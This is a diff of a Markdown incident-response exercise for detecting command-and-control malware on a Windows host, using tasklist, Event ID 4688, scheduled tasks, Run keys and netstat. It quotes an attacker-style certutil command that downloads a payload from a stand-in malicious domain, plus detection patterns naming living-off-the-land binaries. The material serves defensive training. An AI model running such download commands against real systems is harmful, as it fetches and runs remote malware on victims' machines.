@@ -18,75 +18,142 @@ Description: GitHub-compatible Markdown (GHM) version using supported HTML like 
 
 ### 🔎 Scenario: Command and Control (C2) Detection
 
-- Gather logs using Event Viewer
-- Identify malware via IOCs
-- Remove malware and kill process
-- Investigate network activity (C2)
-- Block source and set firewall rules
-- Remove persistence (startup/registry/scheduled tasks)
+This exercise focuses on analysing a compromised Windows host. The attacker leverages built-in Windows binaries like `certutil` and `powershell -enc` for malicious activities. The goal is to detect the infection, investigate indicators, and remove persistence and network access.
 
-### 🧱 Step 1: Process Monitoring
+---
+
+### 🧱 Step 1: Detect Suspicious Process Execution
+
+Start with identifying potentially malicious running processes:
+
+```powershell
+tasklist | findstr /i "powershell cmd python wscript cscript mshta wmic rundll32 regsvr32 schtasks bitsadmin"
+```
+
+You can also use the Task Manager GUI:
+
 ```powershell
 taskmgr
+```
 
-tasklist | findstr /i "powershell cmd python wscript cscript mshta wmic rundll32 regsvr32 schtasks bitsadmin"
+Kill any suspicious or known malicious process:
 
+```powershell
 taskkill /F /PID <PID>
+```
 
+Open Event Viewer to examine process creation logs:
+
+```powershell
 eventvwr
 ```
 
-### 🗓 Step 2: Scheduled Tasks
+> Navigate to: Windows Logs > Security  
+> Look for Event ID `4688` (Process Creation)
+
+🧠 **Pay attention to:**
+
+- **New Process Name**: The binary executed  
+- **Creator Process Name**: What launched it  
+- **Process Command Line**: (if command line logging is enabled)
+
+Enable command line auditing via Group Policy:
+
+`Computer Configuration > Administrative Templates > System > Audit Process Creation > Include command line in process creation events`
+
+---
+
+### 📥 Step 2: Investigate Certutil Abuse
+
+Attackers often abuse `certutil` to download payloads from the internet:
+
 ```powershell
-taskschd
+certutil -urlcache -split -f http://malicious.domain/agent.exe agent.exe
+```
 
-Get-ScheduledTask | ? {
+Check logs (Event Viewer or Sysmon if enabled) for this command line string.
+
+---
+
+### 🧪 Step 3: Decode Obfuscated PowerShell
+
+If you encounter a base64 encoded PowerShell command:
+
+```powershell
+powershell.exe -enc <base64string>
+```
+
+Decode it using this:
+
+```powershell
+[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("<base64string>"))
+```
+
+---
+
+### 🗓 Step 4: Investigate Scheduled Tasks
+
+List scheduled tasks and find non-default or suspicious ones:
+
+```powershell
+schtasks /query /fo LIST /v
+```
+
+Or with PowerShell:
+
+```powershell
+Get-ScheduledTask | Where-Object {
   $_.TaskPath -notmatch "^\\Microsoft\\Windows" -and 
-  ($_.Actions | % Execute | Out-String) -match "cmd|powershell|python|wscript|cscript|.bat|.vbs|.js|.py|mshta|rundll32|schtasks|bitsadmin"
+  ($_.Actions | ForEach-Object { $_.Execute }) -match "cmd|powershell|python|wscript|cscript|.bat|.vbs|.js|.py|mshta|rundll32|schtasks|bitsadmin"
 }
+```
 
+Remove malicious scheduled task:
+
+```powershell
 Unregister-ScheduledTask -TaskName "<SuspiciousTaskName>" -Confirm:$false
 ```
 
-### 🧼 Step 3: Registry Startup
-```powershell
-regedit
+---
 
+### 🧼 Step 5: Registry Persistence
+
+Check `Run` keys used to maintain persistence:
+
+```powershell
 reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
 reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
 ```
 
-### 🌐 Step 4: Network Communications
+Also check:
+
+```powershell
+regedit
+```
+
+---
+
+### 🌐 Step 6: Inspect Network Connections
+
+View active network connections and the processes behind them:
+
 ```powershell
 netstat -bano
 ```
 
-### 📁 Step 5: File Investigation
+> Match suspicious PIDs with output from `tasklist`
+
+---
+
+### 📁 Step 7: Investigate Dropped Files
+
+Search for document files and other suspicious files across users' folders:
+
 ```powershell
-Get-ChildItem -Path C:\Users -Include *.xlsx,*.docx,*.pdf -File -Recurse -ErrorAction SilentlyContinue
+Get-ChildItem -Path C:\Users -Include *.docx,*.xlsx,*.pdf -File -Recurse -ErrorAction SilentlyContinue
 ```
 
-### 📊 Step 6: View Process Launch Events (Event ID 4688)
-```powershell
-# Open Event Viewer and filter:
-# - Log: Security
-# - Event ID: 4688
-# - Time Range: Last hour or relevant window
-```
-> Then double-click an event and go to the **Details > Friendly View** tab. Look for:
-
-- **New Process Name** → The process that was launched  
-- **Creator Process Name** → The parent process that launched it  
-- **Process Command Line** → (if enabled via Group Policy)  
-
-🧠 For example:
-```
-New Process Name:     C:\Windows\System32\powershell.exe
-Creator Process Name: C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
-```
-
-> Enable command line logging via Group Policy:  
-> `Computer Configuration > Administrative Templates > System > Audit Process Creation > Include command line in process creation events`
+---
 
 </details>
 
